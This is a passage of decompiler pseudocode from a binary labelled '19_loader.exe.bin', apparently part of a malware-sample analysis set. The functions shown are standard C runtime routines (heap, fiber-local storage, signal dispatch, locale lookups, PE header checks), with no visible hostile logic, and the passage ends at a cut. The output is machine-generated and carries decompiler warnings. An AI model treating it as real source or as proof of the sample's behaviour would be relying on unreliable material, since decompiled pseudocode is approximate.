/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15988 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015988 rva=0x15988 */

longlong FUN_140015988(void)

{
  undefined8 uVar1;
  longlong lVar2;
  
  if (DAT_1400e0938 != 0) {
    return DAT_1400e0938;
  }
  if ((DAT_1400e0940 == 0) ||
     ((uVar1 = FUN_140015a08(), (int)uVar1 != 0 && (uVar1 = FUN_140015c0c(), (int)uVar1 != 0)))) {
    lVar2 = 0;
  }
  else {
    lVar2 = DAT_1400e0938;
  }
  return lVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x159c4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400159c4 rva=0x159c4 */

void FUN_1400159c4(void)

{
  FUN_140015a7c(&DAT_1400e0938);
  FUN_140015a98(&DAT_1400e0940);
  FUN_140015ab4(DAT_1400e0950);
  FUN_140015ab4(DAT_1400e0948);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15a08 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015a08 rva=0x15a08 */

undefined8 FUN_140015a08(void)

{
  undefined8 uVar1;
  char *pcVar2;
  undefined8 *puVar3;
  
  uVar1 = 0;
  if (DAT_1400e0938 == (undefined8 *)0x0) {
    FUN_1400173dc();
    pcVar2 = FUN_14001b1c8();
    if (pcVar2 == (char *)0x0) {
      FUN_140017fb0((LPVOID)0x0);
      uVar1 = 0xffffffff;
    }
    else {
      puVar3 = FUN_140015af8(pcVar2);
      if (puVar3 == (undefined8 *)0x0) {
        uVar1 = 0xffffffff;
      }
      else {
        DAT_1400e0938 = puVar3;
        DAT_1400e0950 = puVar3;
      }
      FUN_140017fb0((LPVOID)0x0);
      FUN_140017fb0(pcVar2);
    }
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15a7c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015a7c rva=0x15a7c */

void FUN_140015a7c(undefined8 *param_1)

{
  if ((undefined8 *)*param_1 != DAT_1400e0950) {
    FUN_140015ab4((undefined8 *)*param_1);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15a98 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015a98 rva=0x15a98 */

void FUN_140015a98(undefined8 *param_1)

{
  if ((undefined8 *)*param_1 != DAT_1400e0948) {
    FUN_140015ab4((undefined8 *)*param_1);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15ab4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015ab4 rva=0x15ab4 */

void FUN_140015ab4(undefined8 *param_1)

{
  LPVOID pvVar1;
  undefined8 *puVar2;
  
  if (param_1 != (undefined8 *)0x0) {
    pvVar1 = (LPVOID)*param_1;
    puVar2 = param_1;
    while (pvVar1 != (LPVOID)0x0) {
      FUN_140017fb0(pvVar1);
      puVar2 = puVar2 + 1;
      pvVar1 = (LPVOID)*puVar2;
    }
    FUN_140017fb0(param_1);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15af8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015af8 rva=0x15af8 */

undefined8 * FUN_140015af8(char *param_1)

{
  longlong lVar1;
  longlong lVar2;
  undefined8 *puVar3;
  char *pcVar4;
  undefined8 uVar5;
  char cVar6;
  longlong lVar7;
  ulonglong uVar8;
  undefined8 *puVar9;
  
  cVar6 = *param_1;
  lVar7 = 0;
  pcVar4 = param_1;
  while (cVar6 != '\0') {
    lVar1 = lVar7 + 1;
    if (cVar6 == '=') {
      lVar1 = lVar7;
    }
    lVar7 = -1;
    do {
      lVar2 = lVar7;
      lVar7 = lVar2 + 1;
    } while (pcVar4[lVar7] != '\0');
    pcVar4 = pcVar4 + lVar2 + 2;
    lVar7 = lVar1;
    cVar6 = *pcVar4;
  }
  puVar3 = FUN_140019980(lVar7 + 1,8);
  if (puVar3 == (undefined8 *)0x0) {
LAB_140015b5b:
    FUN_140017fb0((LPVOID)0x0);
    puVar3 = (undefined8 *)0x0;
  }
  else {
    puVar9 = puVar3;
    for (; *param_1 != '\0'; param_1 = param_1 + uVar8) {
      lVar7 = -1;
      do {
        lVar1 = lVar7;
        lVar7 = lVar1 + 1;
      } while (param_1[lVar7] != '\0');
      uVar8 = lVar1 + 2;
      if (*param_1 != '=') {
        pcVar4 = FUN_140019980(uVar8,1);
        if (pcVar4 == (char *)0x0) {
          FUN_140015ab4(puVar3);
          FUN_140017fb0((LPVOID)0x0);
          goto LAB_140015b5b;
        }
        uVar5 = FUN_140016340(pcVar4,uVar8,(longlong)param_1);
        if ((int)uVar5 != 0) {
                    /* WARNING: Subroutine does not return */
          FUN_1400180e4();
        }
        *puVar9 = pcVar4;
        puVar9 = puVar9 + 1;
        FUN_140017fb0((LPVOID)0x0);
      }
    }
    FUN_140017fb0((LPVOID)0x0);
  }
  return puVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15c0c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015c0c rva=0x15c0c */

undefined8 FUN_140015c0c(void)

{
  int iVar1;
  undefined8 uVar2;
  byte *pbVar3;
  longlong *plVar4;
  
  plVar4 = DAT_1400e0940;
  if (DAT_1400e0940 == (longlong *)0x0) {
LAB_140015c35:
    uVar2 = 0xffffffff;
  }
  else {
    for (; *plVar4 != 0; plVar4 = plVar4 + 1) {
      iVar1 = FUN_14001b0e8(0,0,*plVar4,0xffffffff);
      if (iVar1 == 0) goto LAB_140015c35;
      pbVar3 = FUN_140019980((longlong)iVar1,1);
      if (pbVar3 == (byte *)0x0) {
        pbVar3 = (byte *)0x0;
LAB_140015ce0:
        FUN_140017fb0(pbVar3);
        goto LAB_140015c35;
      }
      iVar1 = FUN_14001b0e8(0,0,*plVar4,0xffffffff);
      if (iVar1 == 0) goto LAB_140015ce0;
      thunk_FUN_14001b2e0(pbVar3,0);
      FUN_140017fb0((LPVOID)0x0);
    }
    uVar2 = 0;
  }
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15cec | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015cec rva=0x15cec */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140015cec(undefined8 *param_1,undefined8 *param_2)

{
  if (param_1 != param_2) {
    do {
      if ((code *)*param_1 != (code *)0x0) {
        (*(code *)*param_1)();
      }
      param_1 = param_1 + 1;
    } while (param_1 != param_2);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15d24 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015d24 rva=0x15d24 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

undefined8 FUN_140015d24(undefined8 *param_1,undefined8 *param_2)

{
  undefined8 uVar1;
  
  while( true ) {
    if (param_1 == param_2) {
      return 0;
    }
    if (((code *)*param_1 != (code *)0x0) && (uVar1 = (*(code *)*param_1)(), (int)uVar1 != 0))
    break;
    param_1 = param_1 + 1;
  }
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15d60 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015d60 rva=0x15d60 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

undefined4 FUN_140015d60(int param_1,undefined8 param_2)

{
  undefined4 uVar1;
  int *piVar2;
  code *pcVar3;
  undefined8 uVar4;
  undefined8 *puVar5;
  int *piVar6;
  int *piVar7;
  undefined4 uVar8;
  
  puVar5 = FUN_140016c20();
  if (puVar5 != (undefined8 *)0x0) {
    piVar2 = (int *)*puVar5;
    for (piVar6 = piVar2; piVar6 != piVar2 + 0x30; piVar6 = piVar6 + 4) {
      if (*piVar6 == param_1) {
        if (piVar6 == (int *)0x0) {
          return 0;
        }
        pcVar3 = *(code **)(piVar6 + 2);
        if (pcVar3 == (code *)0x0) {
          return 0;
        }
        if (pcVar3 == (code *)0x5) {
          piVar6[2] = 0;
          piVar6[3] = 0;
          return 1;
        }
        if (pcVar3 != (code *)0x1) {
          uVar4 = puVar5[1];
          puVar5[1] = param_2;
          if (piVar6[1] == 8) {
            for (piVar7 = piVar2 + 0xc; piVar7 != piVar2 + 0x30; piVar7 = piVar7 + 4) {
              piVar7[2] = 0;
              piVar7[3] = 0;
            }
            uVar1 = *(undefined4 *)(puVar5 + 2);
            if (*piVar6 == -0x3fffff73) {
              uVar8 = 0x82;
LAB_140015e9e:
              *(undefined4 *)(puVar5 + 2) = uVar8;
            }
            else {
              if (*piVar6 == -0x3fffff72) {
                uVar8 = 0x83;
                goto LAB_140015e9e;
              }
              if (*piVar6 == -0x3fffff71) {
                uVar8 = 0x86;
                goto LAB_140015e9e;
              }
              if (*piVar6 == -0x3fffff70) {
                uVar8 = 0x81;
                goto LAB_140015e9e;
              }
              if (*piVar6 == -0x3fffff6f) {
                uVar8 = 0x84;
                goto LAB_140015e9e;
              }
              if (*piVar6 == -0x3fffff6e) {
                uVar8 = 0x8a;
                goto LAB_140015e9e;
              }
              if (*piVar6 == -0x3fffff6d) {
                uVar8 = 0x85;
                goto LAB_140015e9e;
              }
              if (*piVar6 == -0x3ffffd4c) {
                uVar8 = 0x8e;
                goto LAB_140015e9e;
              }
              uVar8 = uVar1;
              if (*piVar6 == -0x3ffffd4b) {
                uVar8 = 0x8d;
                goto LAB_140015e9e;
              }
            }
            (*pcVar3)(8,uVar8);
            *(undefined4 *)(puVar5 + 2) = uVar1;
          }
          else {
            piVar6[2] = 0;
            piVar6[3] = 0;
            (*pcVar3)(piVar6[1]);
          }
          puVar5[1] = uVar4;
        }
        return 0xffffffff;
      }
    }
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15ecc | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015ecc rva=0x15ecc */

undefined4 FUN_140015ecc(void)

{
  return DAT_1400e0958;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15ed4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015ed4 rva=0x15ed4 */

void FUN_140015ed4(undefined4 param_1)

{
  DAT_1400e0958 = param_1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15edc | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015edc rva=0x15edc */

undefined8 FUN_140015edc(int param_1)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  
  if (((param_1 - 0x4000U & 0xffff3fff) == 0) && (param_1 != 0xc000)) {
    LOCK();
    UNLOCK();
    uVar2 = 0;
    DAT_1400e11c8 = param_1;
  }
  else {
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 0x16;
    FUN_1400180c4();
    uVar2 = 0x16;
  }
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15f20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015f20 rva=0x15f20 */

undefined4 FUN_140015f20(void)

{
  return DAT_1400e095c;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15f30 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015f30 rva=0x15f30 */

uint FUN_140015f30(uint param_1)

{
  uint uVar1;
  undefined8 *puVar2;
  
  if (param_1 < 2) {
    LOCK();
    UNLOCK();
    uVar1 = DAT_1400e095c;
    DAT_1400e095c = param_1;
  }
  else {
    puVar2 = FUN_140018dec();
    *(undefined4 *)puVar2 = 0x16;
    FUN_1400180c4();
    uVar1 = 0xffffffff;
  }
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15f5c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015f5c rva=0x15f5c */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140015f5c(void)

{
  longlong lVar1;
  
  lVar1 = FUN_140016bc0();
  if (*(code **)(lVar1 + 0x18) != (code *)0x0) {
    (**(code **)(lVar1 + 0x18))();
  }
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15f80 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015f80 rva=0x15f80 */

bool FUN_140015f80(short *param_1)

{
  if ((*param_1 == 0x5a4d) &&
     (*(int *)((longlong)*(int *)(param_1 + 0x1e) + (longlong)param_1) == 0x4550)) {
    return (short)((int *)((longlong)*(int *)(param_1 + 0x1e) + (longlong)param_1))[6] == 0x20b;
  }
  return false;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15fb0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015fb0 rva=0x15fb0 */

longlong FUN_140015fb0(longlong param_1,ulonglong param_2)

{
  longlong lVar1;
  longlong lVar2;
  uint uVar3;
  
  uVar3 = 0;
  lVar2 = *(int *)(param_1 + 0x3c) + param_1;
  lVar1 = (ulonglong)*(ushort *)(lVar2 + 0x14) + 0x18 + lVar2;
  if (*(ushort *)(lVar2 + 6) != 0) {
    do {
      if ((*(uint *)(lVar1 + 0xc) <= param_2) &&
         (param_2 < *(int *)(lVar1 + 8) + *(uint *)(lVar1 + 0xc))) {
        return lVar1;
      }
      uVar3 = uVar3 + 1;
      lVar1 = lVar1 + 0x28;
    } while (uVar3 < *(ushort *)(lVar2 + 6));
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16000 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016000 rva=0x16000 */

ulonglong FUN_140016000(longlong param_1)

{
  bool bVar1;
  undefined7 extraout_var;
  ulonglong uVar2;
  longlong lVar3;
  
  bVar1 = FUN_140015f80((short *)&IMAGE_DOS_HEADER_140000000);
  uVar2 = CONCAT71(extraout_var,bVar1);
  if ((int)uVar2 != 0) {
    lVar3 = FUN_140015fb0(0x140000000,param_1 - 0x140000000);
    uVar2 = 0;
    if (lVar3 != 0) {
      uVar2 = (ulonglong)(~*(uint *)(lVar3 + 0x24) >> 0x1f);
    }
  }
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16080 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016080 rva=0x16080 */

void FUN_140016080(void)

{
  FUN_1400160a0();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x160a0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400160a0 rva=0x160a0 */

void FUN_1400160a0(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x160b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400160b0 rva=0x160b0 */

void FUN_1400160b0(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x160c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400160c0 rva=0x160c0 */

/* WARNING: Removing unreachable block (ram,0x0001400160d3) */
/* WARNING: Removing unreachable block (ram,0x0001400160e9) */
/* WARNING: Removing unreachable block (ram,0x0001400160ef) */

void FUN_1400160c0(longlong param_1)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x160f8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400160f8 rva=0x160f8 */

void FUN_1400160f8(void)

{
  code *pcVar1;
  BOOL BVar2;
  longlong lVar3;
  undefined1 *puVar4;
  undefined1 auStack_28 [8];
  undefined1 auStack_20 [32];
  
  lVar3 = FUN_14001863c();
  if (lVar3 != 0) {
    FUN_14001866c(0x16);
  }
  puVar4 = auStack_28;
  if ((DAT_1400dfcb0 & 2) != 0) {
    BVar2 = IsProcessorFeaturePresent(0x17);
    puVar4 = auStack_28;
    if (BVar2 != 0) {
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(7);
      puVar4 = auStack_20;
    }
    *(undefined8 *)(puVar4 + -8) = 0x140016143;
    FUN_14001812c(3,0x40000015,1);
  }
                    /* WARNING: Subroutine does not return */
  *(undefined **)(puVar4 + -8) = &UNK_14001614d;
  FUN_140014d94(3);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16150 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016150 rva=0x16150 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 FUN_140016150(void)

{
  uint dwFlsIndex;
  BOOL BVar1;
  
  dwFlsIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)&LAB_1400162d0);
  DAT_1400dfcb4 = dwFlsIndex;
  if (dwFlsIndex != 0xffffffff) {
    BVar1 = FlsSetValue(dwFlsIndex,&DAT_1400e0960);
    if (BVar1 != 0) {
      _DAT_1400e09d8 = 0xfffffffe;
      return CONCAT31((int3)((uint)BVar1 >> 8),1);
    }
    dwFlsIndex = 0;
    if (DAT_1400dfcb4 != 0xffffffff) {
      dwFlsIndex = FlsFree(DAT_1400dfcb4);
      DAT_1400dfcb4 = 0xffffffff;
    }
  }
  return dwFlsIndex & 0xffffff00;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x161c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400161c0 rva=0x161c0 */

undefined1 FUN_1400161c0(void)

{
  if (DAT_1400dfcb4 != 0xffffffff) {
    FlsFree(DAT_1400dfcb4);
    DAT_1400dfcb4 = 0xffffffff;
  }
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x161f0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400161f0 rva=0x161f0 */

PVOID FUN_1400161f0(void)

{
  DWORD dwErrCode;
  BOOL BVar1;
  PVOID lpFlsData;
  
  if (DAT_1400dfcb4 != 0xffffffff) {
    dwErrCode = GetLastError();
    lpFlsData = FlsGetValue(DAT_1400dfcb4);
    if (lpFlsData != (PVOID)0xffffffffffffffff) {
      if (lpFlsData != (PVOID)0x0) {
LAB_140016288:
        SetLastError(dwErrCode);
        return lpFlsData;
      }
      BVar1 = FlsSetValue(DAT_1400dfcb4,(PVOID)0xffffffffffffffff);
      if (BVar1 != 0) {
        lpFlsData = thunk_FUN_140019980(1,0x80);
        if (lpFlsData == (LPVOID)0x0) {
          FlsSetValue(DAT_1400dfcb4,(PVOID)0x0);
          lpFlsData = (LPVOID)0x0;
        }
        else {
          BVar1 = FlsSetValue(DAT_1400dfcb4,lpFlsData);
          if (BVar1 != 0) {
            *(undefined4 *)((longlong)lpFlsData + 0x78) = 0xfffffffe;
            thunk_FUN_140017fb0((LPVOID)0x0);
            goto LAB_140016288;
          }
          FlsSetValue(DAT_1400dfcb4,(PVOID)0x0);
        }
        thunk_FUN_140017fb0(lpFlsData);
      }
    }
    SetLastError(dwErrCode);
  }
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x162f0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400162f0 rva=0x162f0 */

undefined8 * FUN_1400162f0(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = type_info::vftable;
  if ((param_2 & 1) != 0) {
    thunk_FUN_140017fb0(param_1);
  }
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16320 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016320 rva=0x16320 */

void thunk_FUN_140017fb0(LPVOID param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  uint *puVar4;
  
  if ((param_1 != (LPVOID)0x0) && (BVar1 = HeapFree(DAT_1400e0d30,0,param_1), BVar1 == 0)) {
    DVar2 = GetLastError();
    uVar3 = FUN_140018e5c(DVar2);
    puVar4 = (uint *)FUN_140018dec();
    *puVar4 = uVar3;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16330 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016330 rva=0x16330 */

LPVOID thunk_FUN_140019a00(ulonglong param_1)

{
  bool bVar1;
  int iVar2;
  undefined7 extraout_var;
  LPVOID pvVar3;
  undefined8 *puVar4;
  
  if (param_1 < 0xffffffffffffffe1) {
    if (param_1 == 0) {
      param_1 = 1;
    }
    do {
      pvVar3 = HeapAlloc(DAT_1400e0d30,0,param_1);
      if (pvVar3 != (LPVOID)0x0) {
        return pvVar3;
      }
      iVar2 = FUN_140015f20();
    } while ((iVar2 != 0) &&
            (bVar1 = FUN_140018520(param_1), (int)CONCAT71(extraout_var,bVar1) != 0));
  }
  puVar4 = FUN_140018dec();
  *(undefined4 *)puVar4 = 0xc;
  return (LPVOID)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16340 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016340 rva=0x16340 */

undefined8 FUN_140016340(char *param_1,longlong param_2,longlong param_3)

{
  char cVar1;
  undefined8 *puVar2;
  char *pcVar3;
  
  if ((param_1 != (char *)0x0) && (param_2 != 0)) {
    if (param_3 != 0) {
      pcVar3 = param_1;
      do {
        cVar1 = pcVar3[param_3 - (longlong)param_1];
        *pcVar3 = cVar1;
        pcVar3 = pcVar3 + 1;
        if (cVar1 == '\0') {
          return 0;
        }
        param_2 = param_2 + -1;
      } while (param_2 != 0);
      *param_1 = '\0';
      puVar2 = FUN_140018dec();
      *(undefined4 *)puVar2 = 0x22;
      FUN_1400180c4();
      return 0x22;
    }
    *param_1 = '\0';
  }
  puVar2 = FUN_140018dec();
  *(undefined4 *)puVar2 = 0x16;
  FUN_1400180c4();
  return 0x16;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x163c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400163c0 rva=0x163c0 */

undefined4 FUN_1400163c0(void)

{
  BOOL BVar1;
  uint extraout_EAX;
  uint uVar2;
  uint uVar3;
  ulonglong uVar4;
  
  uVar4 = 0;
  do {
    BVar1 = InitializeCriticalSectionEx((LPCRITICAL_SECTION)(&DAT_1400e09e0 + uVar4 * 0x28),4000,0);
    if (BVar1 == 0) {
      uVar4 = (ulonglong)DAT_1400e0a08;
      uVar2 = 0;
      uVar3 = DAT_1400e0a08;
      while (uVar3 != 0) {
        uVar3 = (int)uVar4 - 1;
        uVar4 = (ulonglong)uVar3;
        DeleteCriticalSection((LPCRITICAL_SECTION)(&DAT_1400e09e0 + uVar4 * 0x28));
        DAT_1400e0a08 = DAT_1400e0a08 - 1;
        uVar2 = extraout_EAX;
      }
      return uVar2 & 0xffffff00;
    }
    DAT_1400e0a08 = DAT_1400e0a08 + 1;
    uVar2 = (int)uVar4 + 1;
    uVar4 = (ulonglong)uVar2;
  } while (uVar2 == 0);
  return CONCAT31((int3)((uint)BVar1 >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16450 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016450 rva=0x16450 */

undefined1 FUN_140016450(void)

{
  uint uVar1;
  ulonglong uVar2;
  
  uVar2 = (ulonglong)DAT_1400e0a08;
  uVar1 = DAT_1400e0a08;
  while (uVar1 != 0) {
    uVar1 = (int)uVar2 - 1;
    uVar2 = (ulonglong)uVar1;
    DeleteCriticalSection((LPCRITICAL_SECTION)(&DAT_1400e09e0 + uVar2 * 0x28));
    DAT_1400e0a08 = DAT_1400e0a08 - 1;
  }
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16460 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016460 rva=0x16460 */

undefined1 FUN_140016460(void)

{
  uint uVar1;
  ulonglong unaff_RBX;
  
  do {
    uVar1 = (int)unaff_RBX - 1;
    unaff_RBX = (ulonglong)uVar1;
    DeleteCriticalSection((LPCRITICAL_SECTION)(&DAT_1400e09e0 + unaff_RBX * 0x28));
    DAT_1400e0a08 = DAT_1400e0a08 + -1;
  } while (uVar1 != 0);
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1648f | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001648f rva=0x1648f */

undefined1 FUN_14001648f(void)

{
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16498 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016498 rva=0x16498 */

bool FUN_140016498(void)

{
  BOOL BVar1;
  DWORD local_res8 [8];
  
  local_res8[0] = 0;
  BVar1 = VirtualProtect(&DAT_140093160,0x100,2,local_res8);
  return BVar1 != 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x164c8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400164c8 rva=0x164c8 */

undefined8 FUN_1400164c8(char param_1)

{
  HMODULE hLibModule;
  undefined *in_RAX;
  undefined8 *puVar1;
  
  if (param_1 == '\0') {
    puVar1 = &DAT_1400e0a10;
    do {
      hLibModule = (HMODULE)*puVar1;
      if (hLibModule != (HMODULE)0x0) {
        if (hLibModule != (HMODULE)0xffffffffffffffff) {
          FreeLibrary(hLibModule);
        }
        *puVar1 = 0;
      }
      puVar1 = puVar1 + 1;
      in_RAX = &DAT_1400e0ac8;
    } while (puVar1 != (undefined8 *)&DAT_1400e0ac8);
  }
  return CONCAT71((int7)((ulonglong)in_RAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1650c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001650c rva=0x1650c */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

INT_PTR FUN_14001650c(void)

{
  FARPROC pFVar1;
  INT_PTR IVar2;
  
  pFVar1 = FUN_140016848(0,"AreFileApisANSI",(uint *)&DAT_14008c018,(uint *)&DAT_14008c01c);
  if (pFVar1 == (FARPROC)0x0) {
    return 1;
  }
  IVar2 = (*pFVar1)();
  return IVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16558 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016558 rva=0x16558 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140016558(ushort *param_1,uint param_2,PCNZWCH param_3,uint param_4,PCNZWCH param_5,
                  int param_6,undefined8 param_7,undefined8 param_8,undefined8 param_9)

{
  LCID Locale;
  FARPROC pFVar1;
  
  pFVar1 = FUN_1400169fc();
  if (pFVar1 == (FARPROC)0x0) {
    Locale = FUN_140016744(param_1,0);
    CompareStringW(Locale,param_2,param_3,param_4,param_5,param_6);
  }
  else {
    (*pFVar1)(param_1,(ulonglong)param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1661c | partial_markers_remain ===== */
/* address=14001661c rva=0x1661c */

DWORD __stdcall FlsAlloc(PFLS_CALLBACK_FUNCTION lpCallback)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014001661c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = FlsAlloc(lpCallback);
  return DVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16624 | partial_markers_remain ===== */
/* address=140016624 rva=0x16624 */

BOOL __stdcall FlsFree(DWORD dwFlsIndex)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016624. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = FlsFree(dwFlsIndex);
  return BVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1662c | partial_markers_remain ===== */
/* address=14001662c rva=0x1662c */

PVOID __stdcall FlsGetValue(DWORD dwFlsIndex)

{
  PVOID pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00014001662c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = FlsGetValue(dwFlsIndex);
  return pvVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16634 | partial_markers_remain ===== */
/* address=140016634 rva=0x16634 */

BOOL __stdcall FlsSetValue(DWORD dwFlsIndex,PVOID lpFlsData)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016634. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = FlsSetValue(dwFlsIndex,lpFlsData);
  return BVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1663c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001663c rva=0x1663c */

void FUN_14001663c(void)

{
  (*(code *)0x0)();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16648 | partial_markers_remain ===== */
/* address=140016648 rva=0x16648 */

BOOL __stdcall
InitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection,DWORD dwSpinCount,DWORD Flags)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140016648. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = InitializeCriticalSectionEx(lpCriticalSection,dwSpinCount,Flags);
  return BVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16650 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016650 rva=0x16650 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140016650(ushort *param_1,uint param_2,LPCWSTR param_3,uint param_4,LPWSTR param_5,
                  int param_6,undefined8 param_7,undefined8 param_8,undefined8 param_9)

{
  LCID Locale;
  FARPROC pFVar1;
  
  pFVar1 = FUN_140016848(0x12,"LCMapStringEx",(uint *)&DAT_14008c030,(uint *)&DAT_14008c038);
  if (pFVar1 == (FARPROC)0x0) {
    Locale = FUN_140016744(param_1,0);
    LCMapStringW(Locale,param_2,param_3,param_4,param_5,param_6);
  }
  else {
    (*pFVar1)(param_1,(ulonglong)param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x16744 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140016744 rva=0x16744 */

